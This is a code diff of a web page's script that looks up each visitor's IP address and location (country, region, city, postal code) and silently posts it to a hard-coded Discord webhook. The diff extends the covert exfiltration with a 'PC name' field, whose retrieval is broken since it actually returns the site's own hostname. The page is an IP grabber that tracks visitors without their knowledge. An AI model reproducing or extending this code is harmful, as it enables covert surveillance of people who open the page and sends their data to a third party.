@@ -26,17 +26,19 @@
                     const city = data.city;
                     const regioncode = data.region_code;
                     const postalcode = data.postal;
-                    sendIPToWebhook(ip, country, region, city, regioncode, postalcode);
+                    const pcName = "PC Name: " + getPCName(); // Get the PC name
+
+                    sendIPToWebhook(ip, country, region, city, regioncode, postalcode, pcName);
                 })
                 .catch(error => {
                     console.log('Error:', error);
                 });
         }
 
-        function sendIPToWebhook(ip, country, region, city, regioncode, postalcode) {
+        function sendIPToWebhook(ip, country, region, city, regioncode, postalcode, pcName) {
             const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
             const payload = {
-                content: `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nRegion Code: ${regioncode}\nPostal Code: ${postalcode}`
+                content: `IP: ${ip}\nCountry: ${country}\nRegion: ${region}\nCity: ${city}\nRegion Code: ${regioncode}\nPostal Code: ${postalcode}\nPc Name: ${pcName}`
             };
             fetch(webhookUrl, {
                 method: 'POST',
@@ -80,6 +82,17 @@
             setTimeout(() => {
                 document.body.removeChild(element);
             }, 11000); // Adjust the timing (in milliseconds) as needed
+        }
+
+        function getPCName() {
+            // PC name retrieval is not straightforward in a web browser due to security restrictions.
+            // This implementation uses a fallback value in case the retrieval fails.
+            try {
+                return window.location.hostname;
+            } catch (error) {
+                console.log('Failed to retrieve PC name:', error);
+                return 'PC Name: Unavailable';
+            }
         }
     </script>
     <style>
